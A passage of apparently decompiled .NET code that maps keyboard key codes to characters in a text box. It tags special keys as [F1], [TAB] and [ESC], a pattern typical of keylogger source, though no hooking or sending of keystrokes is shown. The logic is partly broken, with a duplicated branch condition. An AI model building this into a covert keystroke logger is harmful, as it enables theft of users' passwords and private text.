			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 96)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 97)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 98)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 99)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 100)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 101)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 102)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 103)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 104)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 105)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "H");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "I");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "J");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "K");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "L");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "M");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "N");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "O");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "P");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "R");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "S");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "T");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "U");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "V");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "W");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "X");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "Z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "<");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "_");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "{");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "}");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "|");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ":");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ">");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "~");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (!((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & ((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "1");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "2");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "3");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "4");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "5");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "6");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "7");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "8");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "9");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "0");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "a");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "b");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "c");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "d");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "e");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "f");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "g");
			}
			else if ((int)Key == 72)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "h");
			}
			else if ((int)Key == 73)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "i");
			}
			else if ((int)Key == 74)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "j");
			}
			else if ((int)Key == 75)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "k");
			}
			else if ((int)Key == 76)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "l");
			}
			else if ((int)Key == 77)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "m");
			}
			else if ((int)Key == 78)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "n");
			}
			else if ((int)Key == 79)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "o");
			}
			else if ((int)Key == 80)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "p");
			}
			else if ((int)Key == 81)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "q");
			}
			else if ((int)Key == 82)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "r");
			}
			else if ((int)Key == 83)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "s");
			}
			else if ((int)Key == 84)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "t");
			}
			else if ((int)Key == 85)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "u");
			}
			else if ((int)Key == 86)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "v");
			}
			else if ((int)Key == 87)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "w");
			}
			else if ((int)Key == 88)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "x");
			}
			else if ((int)Key == 89)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "y");
			}
			else if ((int)Key == 90)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "z");
			}
			else if ((int)Key == 188)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ",");
			}
			else if ((int)Key == 189)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 222)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "'");
			}
			else if ((int)Key == 219)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[");
			}
			else if ((int)Key == 221)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "]");
			}
			else if ((int)Key == 191)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 220)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\\");
			}
			else if ((int)Key == 186)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ";");
			}
			else if ((int)Key == 190)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 192)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "`");
			}
			else if ((int)Key == 32)
			{
				TextBox1.set_Text(TextBox1.get_Text() + " ");
			}
			else if ((int)Key == 13)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "\r\n");
			}
			else if ((int)Key == 112)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F1]");
			}
			else if ((int)Key == 113)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F2]");
			}
			else if ((int)Key == 114)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F3]");
			}
			else if ((int)Key == 115)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F4]");
			}
			else if ((int)Key == 116)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F5]");
			}
			else if ((int)Key == 117)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F6]");
			}
			else if ((int)Key == 118)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F7]");
			}
			else if ((int)Key == 119)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F8]");
			}
			else if ((int)Key == 120)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F9]");
			}
			else if ((int)Key == 121)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F10]");
			}
			else if ((int)Key == 122)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F11]");
			}
			else if ((int)Key == 123)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[F12]");
			}
			else if ((int)Key == 46)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 8)
			{
				TextBox1.set_Text(TextBox1.get_Text().Remove(checked(TextBox1.get_Text().Length - 1), 1));
			}
			else if ((int)Key == 40)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 38)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 37)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 39)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "?");
			}
			else if ((int)Key == 9)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[TAB]");
			}
			else if ((int)Key == 35)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[END]");
			}
			else if ((int)Key == 27)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "[ESC]");
			}
			else if ((int)Key == 111)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "/");
			}
			else if ((int)Key == 110)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ".");
			}
			else if ((int)Key == 109)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "-");
			}
			else if ((int)Key == 107)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "+");
			}
			else if ((int)Key == 106)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
		}
		else if (((Computer)MyProject.Computer).get_Keyboard().get_ShiftKeyDown() & !((Computer)MyProject.Computer).get_Keyboard().get_CapsLock())
		{
			if ((int)Key == 49)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "!");
			}
			else if ((int)Key == 50)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "@");
			}
			else if ((int)Key == 51)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "#");
			}
			else if ((int)Key == 52)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "$");
			}
			else if ((int)Key == 53)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "%");
			}
			else if ((int)Key == 54)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "^");
			}
			else if ((int)Key == 55)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "&");
			}
			else if ((int)Key == 56)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "*");
			}
			else if ((int)Key == 57)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "(");
			}
			else if ((int)Key == 48)
			{
				TextBox1.set_Text(TextBox1.get_Text() + ")");
			}
			else if ((int)Key == 65)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "A");
			}
			else if ((int)Key == 66)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "B");
			}
			else if ((int)Key == 67)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "C");
			}
			else if ((int)Key == 68)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "D");
			}
			else if ((int)Key == 69)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "E");
			}
			else if ((int)Key == 70)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "F");
			}
			else if ((int)Key == 71)
			{
				TextBox1.set_Text(TextBox1.get_Text() + "G");
			}
